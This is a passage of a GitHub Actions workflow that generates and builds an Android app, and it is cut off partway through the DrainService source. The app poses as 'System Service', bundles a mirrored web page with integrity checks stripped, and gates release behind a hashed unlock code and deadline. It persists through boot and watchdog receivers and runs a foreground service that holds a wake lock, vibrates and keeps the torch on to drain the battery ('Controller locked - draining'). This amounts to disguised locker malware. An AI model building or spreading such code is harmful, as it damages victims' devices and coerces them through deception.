name: build-apk

on:
  workflow_dispatch:
    inputs:
      page_url:
        description: Public URL of the deployed page to bundle
        required: true
        type: string
      unlock_code:
        description: Unlock code baked into this build
        required: false
        default: "2530253010"
        type: string

concurrency:
  group: build-apk-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.ref_name }}

      - name: Resolve target
        env:
          PAGE_URL: ${{ inputs.page_url }}
        run: |
          set -euo pipefail
          [ -n "$PAGE_URL" ] || { echo "page_url is empty"; exit 1; }
          case "$PAGE_URL" in
            http://*|https://*) ;;
            *) echo "page_url must be http(s)"; exit 1 ;;
          esac
          python3 - "$PAGE_URL" >> "$GITHUB_ENV" <<'PY'
          import sys, urllib.parse
          u = urllib.parse.urlsplit(sys.argv[1])
          port = ":%d" % u.port if u.port else ""
          print("ORIGIN=%s://%s%s" % (u.scheme, u.netloc, port))
          print("HOSTNAME=%s" % u.hostname)
          print("ENTRY=%s" % u.path.lstrip("/"))
          PY
          echo "origin=$ORIGIN host=$HOSTNAME entry=[$ENTRY]"

      - name: Android SDK
        run: |
          set -euo pipefail
          SDK="${ANDROID_SDK_ROOT:-${ANDROID_HOME:-/usr/local/lib/android/sdk}}"
          [ -d "$SDK" ] || { echo "no Android SDK found"; ls /usr/local/lib/android 2>/dev/null; exit 1; }
          echo "SDK=$SDK" >> "$GITHUB_ENV"
          echo "sdk.dir=$SDK" > local.properties
          echo "sdk.dir=$SDK"
          ls "$SDK/build-tools" | sort -V | tail -1

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Signing identity
        run: |
          set -euo pipefail
          if [ -f keystore.jks ] && [ -f keystore.properties ]; then
            echo "Reusing the keystore already in this repo."
          else
            PASS="$(openssl rand -hex 24)"
            keytool -genkeypair -noprompt -keystore keystore.jks \
              -storepass "$PASS" -keypass "$PASS" -alias app \
              -keyalg RSA -keysize 2048 -validity 10000 \
              -dname "CN=System Service, O=BT, C=US"
            printf 'storeFile=keystore.jks\nstorePassword=%s\nkeyAlias=app\nkeyPassword=%s\n' "$PASS" "$PASS" > keystore.properties
            git config user.name "github-actions[bot]"
            git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
            git add -f keystore.jks keystore.properties
            git commit -m "chore: add signing keystore"
            git push || echo "::warning::push rejected - commit keystore.jks and keystore.properties by hand"
          fi
          STOREPASS="$(sed -n 's/^storePassword=//p' keystore.properties)"
          FP="$(keytool -list -v -keystore keystore.jks -storepass "$STOREPASS" -alias app | sed -n 's/.*SHA256: //p;q')"
          echo "Certificate SHA256: $FP"
          echo "| certificate SHA256 | \`$FP\` |" >> "$GITHUB_STEP_SUMMARY"

      - name: Scaffold project
        env:
          PAGE_URL: ${{ inputs.page_url }}
          UNLOCK_CODE: ${{ inputs.unlock_code }}
          UA: Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36
        run: |
          set -euo pipefail
          mkdir -p app/src/main/java/com/bt/service app/src/main/res/drawable app/src/main/res/xml app/src/main/res/values app/src/main/assets
          printf 'local.properties\n.gradle/\napp/build/\n' > .gitignore

          mkdir -p /tmp/site
          RC=0
          wget -nv -p -k -E -nH --no-parent -e robots=off --max-redirect=10 \
            --timeout=20 --tries=3 --user-agent "$UA" -P /tmp/site "$PAGE_URL" || RC=$?
          echo "wget exit: $RC"

          ENTRY_LOCAL="/tmp/site/${ENTRY}"
          [ -d "$ENTRY_LOCAL" ] && ENTRY_LOCAL="${ENTRY_LOCAL%/}/index.html"
          [ -f "$ENTRY_LOCAL" ] || ENTRY_LOCAL="${ENTRY_LOCAL}.html"

          if [ ! -f "$ENTRY_LOCAL" ]; then
            echo "::warning::mirror produced no entry file - falling back to a single-file download"
            rm -rf /tmp/site; mkdir -p /tmp/site
            curl -fsSL --retry 3 --max-time 90 --user-agent "$UA" "$PAGE_URL" -o /tmp/site/index.html
            ENTRY_LOCAL=/tmp/site/index.html
          fi

          ENTRY="${ENTRY_LOCAL#/tmp/site/}"
          echo "ENTRY=$ENTRY" >> "$GITHUB_ENV"
          echo "resolved entry: $ENTRY"
          find /tmp/site -name '*.html' -print0 | xargs -0 -r sed -i -E \
            's/ +integrity="[^"]*"//g; s/ +crossorigin(="[^"]*")?//g'
          cp -a /tmp/site/. app/src/main/assets/

          SALT="$(openssl rand -hex 16)"
          HASH="$(printf '%s' "$SALT$UNLOCK_CODE" | sha256sum | cut -d' ' -f1)"

          cat > app/src/main/res/values/config.xml <<EOF
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <string name="origin" translatable="false">${ORIGIN}</string>
              <string name="entry" translatable="false">${ENTRY}</string>
              <string name="user_agent" translatable="false">$UA</string>
              <string name="code_salt" translatable="false">$SALT</string>
              <string name="code_hash" translatable="false">$HASH</string>
          </resources>
          EOF

          cat > app/src/main/res/xml/network_security_config.xml <<EOF
          <?xml version="1.0" encoding="utf-8"?>
          <network-security-config>
              <base-config cleartextTrafficPermitted="false"/>
              <domain-config cleartextTrafficPermitted="true">
                  <domain includeSubdomains="true">${HOSTNAME}</domain>
              </domain-config>
          </network-security-config>
          EOF

          cat > settings.gradle <<'EOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "SystemService"
          include ":app"
          EOF

          cat > build.gradle <<'EOF'
          // AGP resolved through pluginManagement
          EOF

          cat > gradle.properties <<'EOF'
          org.gradle.jvmargs=-Xmx3g -XX:MaxMetaspaceSize=1g
          org.gradle.parallel=true
          org.gradle.caching=true
          android.useAndroidX=true
          android.nonTransitiveRClass=true
          EOF

          cat > app/build.gradle <<'EOF'
          plugins { id "com.android.application" version "8.5.0" }
          def ks = new Properties()
          def ksFile = rootProject.file("keystore.properties")
          if (ksFile.exists()) ksFile.withInputStream { ks.load(it) }
          android {
              namespace "com.bt.service"
              compileSdk 34
              defaultConfig {
                  applicationId "com.bt.service"
                  minSdk 24
                  targetSdk 34
                  versionCode (project.hasProperty("vc") ? project.vc.toInteger() : 1)
                  versionName (project.hasProperty("vn") ? project.vn : "1.0")
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
              signingConfigs {
                  release {
                      storeFile rootProject.file(ks.getProperty("storeFile", "keystore.jks"))
                      storePassword ks.getProperty("storePassword")
                      keyAlias ks.getProperty("keyAlias", "app")
                      keyPassword ks.getProperty("keyPassword")
                  }
              }
              buildTypes {
                  release {
                      signingConfig signingConfigs.release
                      minifyEnabled false
                      shrinkResources false
                  }
              }
              lint { abortOnError false; checkReleaseBuilds false }
          }
          dependencies {
              implementation "androidx.core:core:1.13.1"
              implementation "androidx.webkit:webkit:1.11.0"
          }
          EOF

          cat > app/src/main/AndroidManifest.xml <<'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
              <uses-permission android:name="android.permission.WAKE_LOCK"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
              <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
              <uses-permission android:name="android.permission.VIBRATE"/>
              <uses-permission android:name="android.permission.CAMERA"/>
              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
              <uses-feature android:name="android.hardware.camera.flash" android:required="false"/>
              <application android:label="System Service" android:icon="@drawable/skull"
                  android:allowBackup="false" android:hardwareAccelerated="true"
                  android:networkSecurityConfig="@xml/network_security_config"
                  android:theme="@android:style/Theme.Material.NoActionBar">
                  <activity android:name=".MainActivity" android:exported="true"
                      android:launchMode="singleTask" android:windowSoftInputMode="adjustResize"
                      android:configChanges="orientation|screenSize|keyboardHidden">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
                  <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED"/>
                          <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                          <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
                      </intent-filter>
                  </receiver>
                  <receiver android:name=".Watchdog" android:enabled="true" android:exported="false"/>
                  <service android:name=".DrainService" android:exported="false"
                      android:foregroundServiceType="specialUse">
                      <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                          android:value="keeps screenless battery-drain loop and torch alive outside the activity"/>
                  </service>
              </application>
          </manifest>
          EOF

          cat > app/src/main/res/drawable/skull.xml <<'EOF'
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp" android:height="108dp"
              android:viewportWidth="512" android:viewportHeight="512">
              <path android:fillColor="#05060A" android:pathData="M0,0h512v512h-512z"/>
              <path android:strokeColor="#FF2B3D" android:strokeWidth="18" android:fillColor="#00000000"
                  android:pathData="M256,96c-72,0 -128,56 -128,128 0,44 22,82 56,104v48h144v-48c34,-22 56,-60 56,-104 0,-72 -56,-128 -128,-128z"/>
              <path android:fillColor="#FF2B3D" android:pathData="M212,224m-28,0a28,28 0,1 1,56 0a28,28 0,1 1,-56 0"/>
              <path android:fillColor="#FF2B3D" android:pathData="M300,224m-28,0a28,28 0,1 1,56 0a28,28 0,1 1,-56 0"/>
          </vector>
          EOF

          cat > app/src/main/java/com/bt/service/Config.java <<'EOF'
          package com.bt.service;
          import android.content.Context;
          import java.nio.charset.StandardCharsets;
          import java.security.MessageDigest;
          final class Config {
              private Config(){}
              static String origin(Context c){ return c.getString(R.string.origin); }
              static String entry(Context c){ return c.getString(R.string.entry); }
              static String userAgent(Context c){ return c.getString(R.string.user_agent); }
              static boolean matches(Context c, String code){
                  if (code == null) return false;
                  try {
                      String salted = c.getString(R.string.code_salt) + code.trim();
                      byte[] d = MessageDigest.getInstance("SHA-256").digest(salted.getBytes(StandardCharsets.UTF_8));
                      StringBuilder sb = new StringBuilder(d.length * 2);
                      for (byte x : d) sb.append(String.format("%02x", x));
                      return MessageDigest.isEqual(
                          sb.toString().getBytes(StandardCharsets.UTF_8),
                          c.getString(R.string.code_hash).toLowerCase().getBytes(StandardCharsets.UTF_8));
                  } catch (Throwable t) { return false; }
              }
          }
          EOF

          cat > app/src/main/java/com/bt/service/Prefs.java <<'EOF'
          package com.bt.service;
          import android.content.Context;
          public final class Prefs {
              private static android.content.SharedPreferences sp(Context c){ return c.getSharedPreferences("bt",0); }
              static long deadline(Context c){ return sp(c).getLong("deadline",0); }
              static void setDeadline(Context c, long v){ sp(c).edit().putLong("deadline",v).apply(); }
              static boolean released(Context c){ return sp(c).getBoolean("released",false); }
              static void setReleased(Context c, boolean v){ sp(c).edit().putBoolean("released",v).apply(); }
              static boolean armed(Context c){ return deadline(c) > 0 && !released(c); }
          }
          EOF

          cat > app/src/main/java/com/bt/service/AssetProxy.java <<'EOF'
          package com.bt.service;
          import android.net.Uri;
          import android.webkit.WebResourceRequest;
          import android.webkit.WebResourceResponse;
          import java.io.ByteArrayInputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.util.HashMap;
          import java.util.Map;
          final class AssetProxy {
              private AssetProxy(){}
              private static WebResourceResponse status(int code, String reason){
                  return new WebResourceResponse("text/plain","utf-8",code,reason,
                      new HashMap<String,String>(), new ByteArrayInputStream(new byte[0]));
              }
              private static WebResourceResponse redirect(String origin, Uri u){
                  Map<String,String> h = new HashMap<>();
                  String q = u.getEncodedQuery();
                  h.put("Location", origin + u.getEncodedPath() + (q == null ? "" : "?" + q));
                  return new WebResourceResponse("text/plain","utf-8",307,"Temporary Redirect",h,
                      new ByteArrayInputStream(new byte[0]));
              }
              static WebResourceResponse fetch(String origin, WebResourceRequest req, String ua){
                  try {
                      if (origin == null || origin.isEmpty()) return status(502, "No origin");
                      Uri u = req.getUrl();
                      if (!"GET".equalsIgnoreCase(req.getMethod())) return redirect(origin, u);
                      String q = u.getEncodedQuery();
                      URL target = new URL(origin + u.getEncodedPath() + (q == null ? "" : "?" + q));
                      HttpURLConnection conn = (HttpURLConnection) target.openConnection();
                      conn.setInstanceFollowRedirects(true);
                      conn.setConnectTimeout(15000);
                      conn.setReadTimeout(25000);
                      conn.setRequestProperty("User-Agent", ua);
                      conn.setRequestProperty("Accept-Encoding", "identity");
                      int code = conn.getResponseCode();
                      if (code >= 400) return status(code, "Upstream error");
                      String ct = conn.getContentType();
                      String mime = "application/octet-stream";
                      String enc = null;
                      if (ct != null) {
                          int i = ct.indexOf(';');
                          mime = (i < 0 ? ct : ct.substring(0, i)).trim();
                          int j = ct.indexOf("charset=");
                          if (j >= 0) enc = ct.substring(j + 8).trim().replace("\"", "");
                      }
                      if (enc == null && (mime.startsWith("text/") || mime.contains("json") || mime.contains("javascript")))
                          enc = "utf-8";
                      WebResourceResponse r = new WebResourceResponse(mime, enc, conn.getInputStream());
                      Map<String,String> h = new HashMap<>();
                      h.put("Access-Control-Allow-Origin", "*");
                      h.put("Cache-Control", "no-store");
                      r.setResponseHeaders(h);
                      return r;
                  } catch (Throwable t) { return status(502, "Proxy failed"); }
              }
          }
          EOF

          cat > app/src/main/java/com/bt/service/DrainService.java <<'EOF'
          package com.bt.service;
          import android.app.*;
          import android.content.*;
          import android.content.pm.ServiceInfo;
          import android.hardware.camera2.CameraManager;
          import android.os.*;
          import androidx.core.app.ServiceCompat;
          import androidx.core.content.ContextCompat;
          public class DrainService extends Service {
              public static final long TOTAL = 30L*60L*1000L;
              private PowerManager.WakeLock lock;
              private CameraManager cam; private String camId; private Vibrator vib;
              private volatile boolean running = true;
              private final Handler h = new Handler(Looper.getMainLooper());
              static boolean start(Context c){
                  try { ContextCompat.startForegroundService(c, new Intent(c, DrainService.class)); return true; }
                  catch (Throwable t) { return false; }
              }
              private boolean promote(String body){
                  try {
                      ServiceCompat.startForeground(this, 1, notif(body),
                          Build.VERSION.SDK_INT >= 29 ? ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE : 0);
                      return true;
                  } catch (Throwable t) { return false; }
              }
              @Override public void onCreate() {
                  super.onCreate();
                  if (!promote("Controller locked - draining")) { stopSelf(); return; }
                  PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                  lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "bt:drain");
                  lock.setReferenceCounted(false); lock.acquire();
                  try {
                      vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                      long[] pattern = {900,140,900,140};
                      if (Build.VERSION.SDK_I
